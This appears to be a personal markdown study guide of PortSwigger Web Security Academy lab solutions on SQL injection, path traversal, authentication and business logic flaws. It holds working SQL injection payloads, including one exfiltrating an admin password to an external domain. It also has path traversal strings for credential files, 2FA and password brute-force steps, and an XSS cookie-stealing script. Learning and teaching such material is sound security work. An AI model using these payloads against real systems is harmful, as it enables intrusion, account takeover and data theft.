# Preliminary
[Github Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)

# Web Penetration Testing Learning path
1. [TryhackMe - Web Fundamentals](https://tryhackme.com/path/outline/web)  
1. [PortSwigger - Web Security Academy](https://portswigger.net/web-security/all-topics)
   - [portswigger-websecurity-academy write-up](https://github.com/frank-leitner/portswigger-websecurity-academy/tree/main)
1. [iNE - eWPT Web Application Penetration Tester](https://security.ine.com/certifications/ewpt-certification/)

# Table of Contents
**Server-side topics (13)**
- [SQL Injection](#sql-injection)
  - [Lab](#sql-injection-lab)
- [Path Traversal](#path-traversal)
  - [Lab](#path-traversal-lab)
- [Authentication](#authentication)
  - [Lab](#authentication-lab)
- [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
  - [Lab](#business-logic-vulnerabilities-lab)
- [Command Injection](#command-injection)
  - [Lab](#command-injection-lab)
- [Information Disclosure](#information-disclosure)
  - [Lab](#information-disclosure-lab)
- [Access Control](#access-control)
  - [Lab](#access-control-lab)
- [File Upload](#file-upload)
- [Race Condition](#race-condition)
- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
- [NoSQL Injection](#nosql-injection)
- [XXE Injection](#xxe-injection)
- [API](#api)

**Client-side topics (6)**
- [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
- [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
- [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
- [Clickjacking](#clickjacking)
- [DOM-based Attacks](#dom-based-attacks)
- [WebSockets](#websockets)

**Advanced topics (11)**
- [Insecure Deserialization](#insecure-deserialization)
- [Web LLM Attacks](#web-llm-attacks)
- [GraphQL API](#graphql-api)
- [Server-side Template Injection](#server-side-template-injection)
- [Web Cache Poisoning](#web-cache-poisoning)
- [HTTP Host Header](#http-host-header)
- [OAuth Authentication](#oauth-authentication)
- [JWT Attacks](#jwt-attacks)
- [Prototype Pollution](#prototype-pollution)
- [Essential Skills](#essential-skills)

**Burp extension**  
- Hackvertor: Encoding and Decoding, data transformation (hashing, encryption, decryptin, convert, string)
- Turbo Intruder: sending large numbers of HTTP requests and analyzing the results   
  
## SQL Injection
**How to detect**     
- single quote ' and look for errors or other anomalies
- Boolean condition `OR 1=1` and `OR 1=2`
- time delays

**Basic SQL**  
- `' OR 1=1 --`

**In-band: Error-Based Injection**  
- `'; SELECT 1/0 --`

**In-band: Union-Based Injection**  
- Determine the number of columns required: `' ORDER BY 1--`  OR `' UNION SELECT NULL,NULL--`
- Oracle specific syntext: `' UNION SELECT NULL FROM DUAL--`
- Retrieve other records: `' UNION SELECT 1, username, password FROM users --`

**Blind: Boolean-based Injection**  
- `' AND '1'='1` (Return results)
- `' AND '1'='2` (No results)
- `' AND SUBSTRING(@@version, 1, 1)='M'` (Check if the first character is 'M')
- Automate the payload (Burpsuite Intruder)

**Blind: Time-Base Injection**  
- `'; WAITFOR DELAY '0:0:10' --`

**Out-of-Band (OOB) Injection**  
- `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`

**Second order/Stored Injection**  
- username: `attacker'--`: unauthorized access
- `INSERT INTO users (username, password) VALUES ('attacker'--', 'password123');`
- username: `JohnDoe'); DROP TABLE users;--`: delete table
- `INSERT INTO users (username, password) VALUES ('JohnDoe'); DROP TABLE users;--', 'password123');`  

**Examine the specific database**  
- DB version: Microsoft, MySQL: @@version； PostgreSQL： version()；Oracle: SELECT banner FROM **v$version**
- Comment: Others: --, /* */; MySQL: #
- **All DB except Oracle**: SELECT TABLE_NAME FROM information_schema.tables, SELECT * FROM information_schema.columns WHERE TABLE_NAME = 'Users'
- **Oracle**: SELECT * FROM all_tables, SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
- Oracle built-in table: ' UNION SELECT NULL FROM **DUAL**--
- String concatenation: PostgreSQL, Oracle ||, Microsoft +, MySQL <SPACE>
- Substring: Others: SUBSTRING('footbar', 4, 2); Oracle: SUBSTR('footbar', 4, 2)
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Remediation**  
- Prepared Statements (With Parameterized Queries)
  `PreparedStatement pstmt = connection.prepareStatement(query);`
- Whitelisting permitted input values
- Escape Special Characters  

### SQL Injection Lab
1. SQL injection vulnerability in WHERE clause allowing **retrieval of hidden data**
   - GET /filter?category=`' OR 1=1 --`
   - Verify that the response now contains one or more unreleased products
2. SQL injection vulnerability allowing **login bypass**
   - POST /login
   - modify the body parameter username=`administrator'--`&password=password
5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
   - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
7. SQL injection UNION attack, **finding** a **column** containing **text**
   - GET /filter?category=`' UNION SELECT NULL,'abc',NULL--`
9. SQL injection UNION attack, **retrieving data** from other tables
    - GET /filter?category=`' UNION SELECT username, password FROM users--`
11. SQL injection attack, querying the **database type and version on Oracle**
    - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
    - GET /filter?category=`' UNION SELECT @@version,'def'#`
15. SQL injection attack, **listing the database contents on non-Oracle databases**
    - tables: `' UNION SELECT table_name, NULL FROM information_schema.tables--`
    - columns: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--`
    - records: `' UNION SELECT username, password FROM users--`
17. SQL injection attack, **listing the database contents on Oracle**
    - tables: `' UNION SELECT table_name,NULL FROM all_tables--`
    - columns: `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--`
    - records: `' UNION SELECT USERNAME, PASSWORD FROM USERS--`
19. SQL injection UNION attack, **retrieving multiple values in a single column**
    - `' UNION SELECT NULL,username||'~'||password FROM users--`
21. **Blind SQL injection** with **conditional responses**
    - Check response  
      Cookie: TrackingId=ZZZ`' AND '1'='1`  (Welcome back)  
      Cookie: TrackingId=ZZZ`' AND '1'='2`  (No record)  
    - confirm table name: `' AND (SELECT 'a' FROM users LIMIT 1)='a`
    - confirm user name: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    - confirm length of password (Burp intruder: Sniper) 
      Cookie: TrackingId=ZZZ`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a;`  
      **Position**:§1§; **Paylaods**: Numbers; From 1 to 20; **Settings**>Grep - Match: Welcome back --> Start Attack  
    - enumerate password (Burp intruder: cluster bomb)  
      Cookie: TrackingId=ZZZ`' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`  
      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9
    - Automation [Python script](https://github.com/sandunigfdo/Web-Security-Academy-Series/blob/2be2887b7a2818dd6e7d5f0ed1ac6b01fcfcac28/SQL%20injection/sqli-Lab11.py)  
      py sqli-Lab11.py [https://xxx.web-security-academy.net/]  
      [+] Retrieving administrator password.... rvxvtobfe7e_____
23. **Blind SQL injection** with **conditional errors**
    - Check response  
      Cookie: TrackingId=ZZZ`'` (Error)  
      Cookie: TrackingId=ZZZ`''` (No Error)  
    - confirm table name: TrackingId=ZZZ`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    - confirm user name: TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    - confirm length of password (Burp intruder: Sniper)  
      TrackingId=ZZZ`'||(SELECT CASE WHEN LENGTH(password)=§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
       **Position**:§1§; **Paylaods**: Numbers; From 1 to 20;-->Start Attack-->Find 500 response code  
    - enumerate password (Burp intruder: cluster bomb)  
      TrackingId=ZZZ`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
      **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9-->Start Attack-->Find 500 response code
25. Visible **error-based** SQL injection
    - Single quote to output verbose error message  
      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf''. Expected  char
    - `' AND CAST((SELECT 1) AS int)--`  
      ERROR: argument of AND must be type boolean, not type integer Position: 63
    - `' AND 1=CAST((SELECT 1) AS int)--`  
      No error  
    - `' AND 1=CAST((SELECT username FROM users) AS int)--`  
      Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf' AND 1=CAST((SELECT username FROM users) AS'. **Expected  char**
    - Delete cookie value to free up some additional characters. Resend the request  
      ERROR: **more than one row** returned by a subquery used as an expression  
    - `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`  
      ERROR: invalid input syntax for type integer: "**administrator**"  (leaks the first username)
    - `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`  
      ERROR: invalid input syntax for type integer: "**41nsvq98jt6vtegvlafu**"
27. Blind SQL injection with **time delays**
    - `'||pg_sleep(10)--`
29. Blind SQL injection with **time delays** and **information retrieval**
    - Note: URL encode key character ';' = '%3B'
    - Test true condition time delay  
      `'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(3) END--`
    - Test false condition and no time delay  
      `%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(3) END--`
    - Verify username is 'administrator'. Condition is true, time delay  
      `'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
    - Retrieve password length (Burp Intruder: Sniper)-->**Click columns-->Response Received**-->To monitor time response  
      `'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=§1§) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
    - Extract a single character from the password (Burp Intruder:Cluster Bomb)-->Resource Pool-->Max 1 concurrent request
      `'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--`
31. Blind SQL injection with **out-of-band** interaction
    - Perform a DNS lookup to an external domain. Use Burp Collaborator client to generate a unique Burp Collaborator subdomain, and then poll the collaborator server to confirm that a [DNS lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet#DNS%20lookup) occurred.
    - Click Burp Menu-->**Burp Collaborator Client**-->Button 'Copy to clipboard'
    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
    - Convert payload to URL encode format then send request
    - Click Button '**Poll now**'  
33. Blind SQL injection with **out-of-band data exfiltration**
    - `EXTRACTVALUE` is an Oracle SQL function that retrieves the value of a specified XML element.
    - `xmltype(...)` creates an XMLType from the given string.
    - `<?xml version="1.0" encoding="UTF-8"?>` is XML declaration.
    - `<!DOCTYPE root [ ... ]>` defines a Document Type Definition (DTD) for the XML.
    - `<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">` defines an external entity %remote that fetches content from a remote URL. The URL is dynamically constructed by concatenating a static string ("http://) with the result of a subquery (SELECT password FROM users WHERE username='administrator') and a static string ('.BURP-COLLABORATOR-SUBDOMAIN/").
    - `%remote;` This entity reference is used to include the content fetched from the remote URL into the XML document.
    - `FROM dual` is a dummy table used in Oracle databases when a table reference is required but no actual table is necessary.
    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
    - In burp colloborator, click button 'Poll now'. Read the description: The Collaborator server received a DNS lookup of type AAAA for the domain name **7rma86kuw6xbyvgxltiy**.7169ftyykb10b1kwbjhbipnfz65wtl.oastify.com  
35. SQL injection with **filter bypass** via **XML encoding**
    - Search for **XML body parameter** `<storeId>1</storeId>`
    - Install Burp extensions:**Hackvertor**
    - `<storeId>1 UNION SELECT NULL</storeId>` **WAF detected**
    - Highlight your input, right=click, then select Extensions > Hackvertor > Encode > **hex_entities**
      `<@hex_entities>1 UNION SELECT NULL<@/hex_entities>`
    - **Concatenate** the returned usernames and password: administrator~seqzzom9u0zc7ixuy3cg  
      `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`

## Path Traversal
**Default root directories**
| Web Server         | Operating System     | Default Root Directory      |
|--------------------|----------------------|-----------------------------|
| Apache HTTP Server | Linux                | `/var/www/html`             |
|                    | Debian/Ubuntu        | `/var/www/html`             |
|                    | CentOS/RHEL          | `/var/www/html`             |
|                    | Fedora               | `/var/www/html`             |
|                    | SUSE/openSUSE        | `/srv/www/htdocs`           |
| Nginx              | Linux                | `/usr/share/nginx/html`     |
|                    | Debian/Ubuntu        | `/var/www/html`             |
|                    | CentOS/RHEL          | `/usr/share/nginx/html`     |
|                    | Fedora               | `/usr/share/nginx/html`     |
|                    | SUSE/openSUSE        | `/srv/www/htdocs`           |
| Microsoft IIS      | Windows Server       | `C:\inetpub\wwwroot`        |
| Apache Tomcat      | Cross-platform       | `/var/lib/tomcat/webapps`   |

**OS folder directory**  
- Linux forward slash: `../../../etc/passwd`
- Windows backslash: `..\..\..\windows\win.ini`

**Interesting files**
| Operating System          | File Path                              | Description                                                   |
|---------------------------|----------------------------------------|---------------------------------------------------------------|
| **Linux and Unix-like**   | `/etc/passwd`                          | User account information                                      |
|                           | `/etc/shadow`                          | Encrypted passwords (requires elevated privileges)             |
|                           | `/var/log/auth.log`                    | Authentication logs                                           |
|                           | Web server configuration files, e.g., `/etc/nginx/nginx.conf` | Server configuration settings                      |
| **Windows**               | `C:\Windows\System32\config\SAM`       | Windows system account information                           |
|                           | `C:\boot.ini`                          | Boot configuration (older Windows versions)                    |
|                           | `C:\Windows\win.ini`                   | Initialization file settings                                  |
|                           | Web server configuration files, e.g., `C:\xampp\apache\conf\httpd.conf` | Server configuration settings          |
| **Web Application Context**| Web root directory files, e.g., `index.html`, `default.aspx` | Default web pages                        |
|                           | `.htaccess`                            | Apache configuration file in web root                          |
|                           | User-uploaded files stored in accessible directories         | Uploaded content                                              |
|                           | Application configuration files, e.g., `web.config` (ASP.NET), `application.properties` (Java) | Application settings        |
|                           | Log files, e.g., `access.log`, `error.log`                   | Application and server logs                                   |


**Techniques**
| Technique                   | Description                                                                 | Example                         | Defense Strategy                                                                 |
|-----------------------------|-----------------------------------------------------------------------------|---------------------------------|----------------------------------------------------------------------------------|
| Dot-Dot-Slash (`../`)       | Traverses up one directory level relative to the current directory          | `../../../../etc/passwd`        | Input validation, normalize paths, restrict access to known directories            |
| Encoded Characters          | Uses URL encoding (%2e%2e%2f) to obfuscate traversal sequences              | `..%252f..%252fetc/passwd`      | Decode URL parameters, enforce strict input validation                            |
| Absolute Path Traversal     | Directly accesses files using absolute paths                                | `/etc/passwd`                   | Validate input against allowed directories, avoid user-controlled absolute paths  |
| Null Byte (%00)             | Terminates string interpretation, bypasses file extension restrictions      | `../../../etc/passwd%00.jpg`    | Filter out null bytes, enforce strict input validation                            |
| Unicode/UTF-8 Encoding      | Uses encoded Unicode characters to represent traversal sequences            | `..%c0%af..%c0%afetc/passwd`    | Normalize Unicode characters, validate and sanitize input                         |
| Double URL Encoding         | Encodes characters multiple times to bypass input filters                   | `..%252e%252e%252fetc/passwd`   | Decode multiple times, validate and sanitize input                                |
| Alternative Data Streams    | Exploits NTFS file system feature to access hidden data streams             | `file.txt::$DATA`               | Restrict access to filesystem features, sanitize input parameters                 |
| Bypass Normalization        | Exploits differences in path normalization algorithms                      | `..\/..\/etc/passwd`            | Use consistent path normalization routines, sanitize and validate input           |

**Mitigation**  
- Input validation and sanitization (validate input, reject unsafe chrs, use whitelist)
- Canonicalization of Paths  
  ```Java
  File file = new File(BASE_DIRECTORY, userInput);
  if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
  } 
  ```
- Allowlisting for file inclusion and access
- Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. PHP `allow_url_fopen` `allow_url_include`

### Path Traversal Lab  
1. File path traversal, simple case
   - check for image request traffic: Use **burp site map filter**-->check '**Images**'-->Apply
   - GET /image?filename=`../../../../etc/passwd`
3. File path traversal, traversal sequences blocked with **absolute path bypass**
   - GET /image?filename=`/etc/passwd`
5. File path traversal, traversal sequences **stripped non-recursively**
   - GET /image?filename=`....//....//....//etc/passwd` (bypass blacklist `../`)
7. File path traversal, traversal sequences **stripped with superfluous URL-decode**
   - **URL encoding** %2f: `..%2f..%2f..%2fetc/passwd`
   - **URL double encoding** %252f: `..%252f..%252f..%252fetc%252fpasswd`
9. File path traversal, validation of **start of path**
    - GET /image?filename=`/var/www/images/../../../etc/passwd`
11. File path traversal, validation of **file extension with null byte bypass**
    - GET /image?filename=`../../../etc/passwd%00.png`

## Authentication
**Types of Authentication**  
- Password-based login
  - username: business login in format of firstname.lastname; profile name same as login username; email address disclosed in HTTP response such as administrator or IT support
  - password: min chr + lower and uppercase letter + 1 special character. Fine tune the wordlist such as 'Mypassword1!', 'Mypassword2!'
  - Infer correct credential: status code, error message, response times
  - account locking  - pick a max 3 password guessess + list of victim user
  - credential stuffing - resuse the same username and password on multiple website
  - bypass IP blocking - change 'X-Forwarded-For'
- HTTP basic authentication
  - identify the authorization header in the request: `Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=`
  - Decode the Base64 string to get username:password
  - Use burp suite's intruder to brute force attack
- Multi-factor authentication  
  - skip to "logged-in only" pages after completing the first authentication step
  - attack log in using their credentials but change the 'account' cookie to any arbitrary username when submitting the verification code
  - brute-force 2FA verification codes by using 'Turbo Intruder' burp extension.
- OAuth authentication
- Other authentication mechanism
  - predictable/cleartext/stealing cookie value (remember me)
  - resetting user password (sending passwords by email, easily guess reset password URL, steal another user's token and change their password)   
- authentication flaw
  - email verification bypass: login without verifying email address
  - duplicate accounts: existing accounts with the same email or username
  - no current password verification
  - does not invalidate active sessions after a password change
  - no rate limiting
  - password reset links are not expiring quickly or easily guessable
  - using easily guessable security questions
  - no notification for password reset
  - login form reveals whether a username or email exists from error message
  - no account lockout after multiple failed login attempts
  - allow login from multipe locations simultaneously without any alerts
  - lack of 2FA
  - insecure session management
 
**Mitigation**   
- never disclose credential in cleartext anywhere (use HTTPS, HSTS header)    
- password policy   
- use identical, generic error msg, same HTTP status code, response time   
- IP-based user rate limiting + CAPTCHA
- verify logic flaws
- 2FA with a dedicated device or app to generate the code

### Authentication Lab
1. **Username enumeration** via different **responses**
   - Enumerate username: Burp intruder>Snipper>Simple list>username=§user1§&password=pass1  
     Observe different **response length**: Incorrect password (athena)/ Invalid username  
   - Enumerate password: Burp intruder>Snipper>Simple list>username=athena&password=§pass1§  
     Observe different **status code**: 302 (jessica)/ 200  
3. **Username enumeration** via **subtly** different **responses**  
   - Enumerate username: Burp intruder>Snipper>Simple list>username=§user1§&password=pass1-->  
     **Grep - Extract**-->Add-->highlight the text content "Invalid username or password."-->OK  
     Observe different **response length**: Invalid username or password (applications)/ Invalid username or password.  
   - Enumerate password: Burp intruder>Snipper>Simple list>username=applications&password=§pass1§  
     Observe different **status code**: 302 (monkey) / 200
5. Username enumeration via **response timing**
   - **Bypass max attempt**:You have made too many incorrect login attempts. Please try again in 30 minute(s).
   - Enumerate username:Burp intruder>**Pitchfork** (Pair up payload 1:1, 2:2, 3:3)>  
     **payload set 1: X-Forwarded-For: b§1§-->Numbers (1 to 100), Max fraction digits: 0**  
     payload set 2: username=**§user1§**: username wordlist  
     Observe the **response received (longer time)** for valid username (test few attempts to see the consistent longer response for same username)  
   - Enumerate password:Burp intruder>Pitchfork>  
     payload set 1: X-Forwarded-For: b§1§-->Numbers (1 to 100), Max fraction digits: 0  
     payload set 2: username=analyzer&password=**§pass1§**: password wordlist  
     Observe different **status code**: 302 (monkey) / 200  
7. **Broken brute-force protection**, IP block
   - **Your credentials: wiener:peter**
   - **Victim's username: carlos**
   - Enumerate password for victim user 'carlos':Burp intruder>**Pitchfork**
     Payload position-->username=§user1§&password=§pass1§
     Resource pool-->Maximum concurrent: 1
     payload set 1: wienber, carlos, wiener, carlos....
     payload set 2: peter, 123456, peter, password.....
9. **Username enumeration via account lock**
    - **Enumerate username**:Burp intruder>**Cluster bomb**
      position: username=§user§&password=pass§§
      payload set 1: username wordlist  
      payload set 2: null payloads-->Generate 5 payloads  
      **Observe the multiplle same length**：You have made too many incorrect login attempts. Please try again in 1 minute(s). Note the username
    - **Enumerate password**:Burp intruder>**Snipper**
      username=ai§&password=§pass1§  
      payload set 1: password wordlist
      **Grep - Extract: Invalid username or password.**
      Obsereve the empty extract column: note the password
11. Broken brute-force protection, **multiple credentials per request (Expert)**
    - replace the single string value of password with an array of password wordlist  
    - 302 response-->right click request-->show response in browser  
    ```json
    {
    "username" : "carlos",
    "password": [
        "123456",
        "password",
        "qwerty"
        ...
    ]
    ```
13. **2FA simple bypass**
    - skip to logged in page after 1FA
15. **2FA broken logic**
    - POST /login HTTP/2  
      **username=wiener**&password=peter
    - 1 step authentication  
      GET /login2 HTTP/2  
      Cookie: verify=wiener; session=xxx  
    - POST /login2 HTTP/2  
      Cookie: verify=wiener; session=xxx   
      mfa-code=0950  
    - Logout from my account  
    - send to **repeater**: GET /login2 HTTP/2 to repeater  (**change verify=carlos;**)  
    - send to **intruder**: POST /login2 HTTP/2  
      Cookie: verify=carlos; session=xxx  
      **mfa-code=§1381§**  
      Burp intruder-->Sniper-->payload brute forcer 0...9, min/max length 4  
    - Load the 302 response in the browser  
17. **2FA bypass using a brute-force attack (Expert)**
    - Burp capture request > Login (carlos:montoya) with wrong MFA code  
    - Setting > Project > Sessions > Add session handling rule > click tab 'scope' > URL scope > include all urls  
    - click Tab 'Details' > Add rule actions > Run a macro > Add select macro > select 3 requests > click OK button  
      - GET /login  
      - POST /login
      - GET /login2
    - click button 'testmacro' > verify the response - please enter your 4 digit code > OK...OK...OK
    - send to intruder > POST /login2  
      position: mfa-code = $2222$
      payload: Numbers from 0 9999 step 1, min/max 4 digits, max fraction digits 0, resource pool: max concurrent requests 1
    - Load the 302 response in the browser
19. Brute-forcing a **stay-logged-in cookie**
    - Your credentials: wiener:peter; Victim's username: carlos   
    - Decode d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw > wiener:51dc30ddc473d43a6011e9ebba6ca770
    - Base64 username:md5 password
    - Burp Intruder Sniper > **Payload processing** > add > load password wordlist
      - Hash: MD5   
      - Add prefix: carlos:
      - Encode: Base64-encode
    - GET /my-account?id=wiener
      Cookie: stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§;
21. **Offline password cracking**
    - Post a **comment**
      `<script>document.location='https://exploit-0a680029042c93b5820a0aee01dc0053.exploit-server.net/'+document.cookie</script>`
    - **Read the cookie value** in exploited server access log   
      `10.0.4.147      2024-07-10 14:26:31 +0000 "GET /secret=stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`   
    - Decode > carlos:26323c16d5f4dabff3bb136f2460a943
    - https://crackstation.net/ crack the hash: 26323c16d5f4dabff3bb136f2460a943 > carlos:onceuponatime
23. **Password reset** broken logic
   - Perform password reset
     **Password reset url** in email: https://0a6b00d9033b21ce818ee8ce00b2005e.web-security-academy.net/forgot-password?temp-forgot-password-token=a5fk32fn68feb75ik9xp91sfoekxn11j
   - Capture the password reset **traffic**
     - POST /forgot-password?**temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j
     - Body: **temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j&**username=wiener**&new-password-1=123456&new-password-2=123456
   - Send to **repeater** and modify in below
     - POST /forgot-password?temp-forgot-password-token=
     - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
25. Password reset poisoning via **middleware**
   - **Perform password reset **  
     Password reset url in email: https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?temp-forgot-password-token=5e8pujqdepap1aow7n5jiahx9ncik0wd   
   - Send to repeater and **perform password reset as victim user**   
     POST /forgot-password   
     add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`   
   - Change in below and submit   
     POST /forgot-password?temp-forgot-password-token=temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
     Response: please check your email for a reset password link   
   - Exploit server access log   
     10.0.3.157      2024-07-10 15:00:32 +0000 "GET /forgot-password?temp-forgot-password-token=**ofunlh8j6vngx003vnifub7hywv4ppw1**   
   - replace old token with new one and access the password reset url (change carlos password)   
     https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?**temp-forgot-password-token=ofunlh8j6vngx003vnifub7hywv4ppw1**   
26. **Password brute-force via password change**
     - Enter wrong current password (diff pair of new password): Current password is incorrect
     - Enter correct current password (diff pair of new password): New passwords do not match
     - Burp Intruder Sniper > **username=carlos**&current-password=**§curr123§**&new-password-1=1234&new-password-2=5678 > password wordlist
     - Grep match "New passwords do not match"

## Business Logic Vulnerabilities
**Examples of business logic vulnerabilities**   
- Excessive trust in **client-side controls**
  - Relying on client-side validations (e.g., JavaScript checks) without proper server-side validation.
  - Attackers can bypass client-side checks by manipulating the client (e.g., using browser developer tools) and sending malicious data directly to the server.   
- Failing to handle **unconventional input**
  - Not anticipating or properly validating unexpected or unconventional input.
  - Applications might not sanitize or validate input thoroughly, allowing attackers to inject harmful input, such as SQL injection, command injection, or cross-site scripting (XSS).   
- Making flawed **assumptions about user behavior**
  - Assuming users will follow a predictable and correct path or input sequence
  - Users might interact with the application in unexpected ways, leading to vulnerabilities such as authorization bypass, where an attacker might access restricted functions or data by manipulating parameters or session states   
- **Domain-specific** flaws
  - Application logic errors specific to the domain or business logic of the application.
  - Errors occur when developers do not fully understand the business rules or when complex workflows are not adequately implemented. For example, an e-commerce site might fail to properly check discount eligibility, allowing an attacker to apply discounts inappropriately.   
- Providing an **encryption oracle**
  - Exposing encryption or decryption functionality in a way that attackers can exploit to gain unauthorized access
  - If an application provides an API for encryption or decryption and does not properly secure it, attackers can use it to encrypt or decrypt data without authorization, potentially revealing sensitive information.   

**Common logic flaw vulnerabilities**
- **Race Conditions**: When two or more processes access shared resources in an uncontrolled manner, leading to unpredictable results
- **Time-of-Check to Time-of-Use (TOCTOU)**: When there is a delay between checking a condition and using the result of that check, allowing attackers to change the state in between
- **Authorization Flaws**: When applications do not properly enforce access controls, allowing users to access resources or perform actions they should not be allowed to
- **State Management Issues**: When the application improperly manages state information (e.g., session tokens, cookies), leading to session fixation or session hijacking attacks
  
**Mitigation**   
- Understand the domain that the application serves
- void making implicit assumptions about user behavior
- Maintain clear design documents and data flows for all transactions and workflows
- Write code as clearly as possible
- Note any references to other code that uses each component   

### Business Logic Vulnerabilities Lab
- Excessive trust in **client-side control**s
  - The application **does not perform adequate server-side validation** of the price parameter. It trusts the value sent by the client without verifying it against a known, legitimate price from the database
  - POST /cart
    productId=1&redir=PRODUCT&quantity=1&**price=10**    
- **2FA broken logic**
  - The application fails to properly bind the 2FA verification process to the original user's session   
  - Login my account via 2FA
  - Repeater: GET /login2 - change verify = victim user
  - Intruder: POST /login2 - brute force mfa-code
- **High-level logic** vulnerability
  - The business logic does not account for the **possibility of negative quantities**, leading to incorrect calculations of total price and quantity. **Restrict user input to values that adhere to the business rule**.
  - store credit $200
  - Add one wish list item $1000
  - Add one cheaper item $150 X (-6) quantity
  - Amend the quantity to negative number
    POST /cart
    productId=12&redir=PRODUCT&**quantity=-6**
  - $1000 - $900 = total $100 place order
- **Low-level logic** flaw
  - The total price is calculated using an integer type that can only hold values up to a certain maximum (2,147,483,647 for a 32-bit signed integer). When the total price exceeds this value, it wraps around to the minimum negative value (-2,147,483,648) due to integer overflow.
  - observing: Burp Intruder Sniper > **Payloads null payloads> continue indefinitely** > **$2,147,483,647** > wrapped around to the minimum value (**-2,147,483,648**)   
  - Add Jacket to cart. Burp Intruder > Change quantity=99 > Payloads "Null payloads" > Generate 323 payloads > max concurrent 1 requests > -$-64060.96
  - Burp Repeater > change qty to 47 > $-1221.96
  - Add a cheaper item > increase quantity > until total reduce to <$100
- Inconsistent handling of **exceptional input**
  - **Site Map** > Right click target url > **Engagement Tools > Discover content** > click button "session is not running"
  - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
  - **Email** truncated to **255 chrs**
  - Register "[Long string chrs total of 255 including sudomain add]@dontwannacry.com.exploit-0a6500480408835d81947f9901c70002.exploit-server.net"
- Inconsistent security controls
  - **Trusted users won't always remain trustworthy**
  - Use admin subdomain as email and login as admin type user
  - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
  - Update email as hacker**@DontWannaCry.com**
- Weak isolation on dual-use endpoint
  - change password for admin (remove current-password param, and update username)
  - POST /my-account/change-password
  - original: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&username=wiener&~~scurrent-password=peter~~s&new-password-1=123456&new-password-2=123456
  - modified: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&**username=administrator**&&new-password-1=123456&new-password-2=123456
- **Password reset broken logic**
  - **remove one parameter** at a time > deleting the name of the parameter as well as the **value**
  - Users won't always supply mandatory input
